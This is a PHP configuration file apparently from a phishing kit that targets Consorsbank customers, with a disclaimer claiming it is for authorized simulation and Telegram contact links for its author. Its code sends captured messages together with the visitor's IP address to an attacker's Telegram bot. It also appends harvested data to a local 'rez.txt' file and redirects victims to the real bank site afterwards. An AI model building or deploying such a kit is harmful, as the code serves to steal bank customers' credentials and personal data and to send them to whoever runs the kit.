<?php

/*
 * WARNING: This code is intended for authorized phishing simulation and security awareness training ONLY.
 * It is designed to help organizations educate users about phishing risks in a controlled, legal environment.
 * Any unauthorized use, reproduction, or distribution of this code for malicious purposes such as real phishing attacks
 * is strictly prohibited and may result in legal consequences.
 * This example page was made by @j33h4n
 * ------------------------------------
 * ------------------------------------
 * ------------------------------------
 * [ CONTACT ME ]
 * Telegram me: https://t.me/j33h4n 
 * Join my channel: https://t.me/+Fh3FAJBUw680YTE8
 */

// telegram information
$token = "";
$id = "";


// exit link
$exit = "https://www.consorsbank.de/home";


// allow telegram notifications [ON|OFF]
$notifications = "ON";







 
function call($msg){
    global $token;
    global $id;
    $info = "/- MORE INFO -/
IP: ".$_SERVER['REMOTE_ADDR'];

    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}


function save($txt){
    $fp = fopen((__DIR__)."/rez.txt", "a");
    fwrite($fp, $txt);
    fclose($fp);
}


$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
$ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}




?>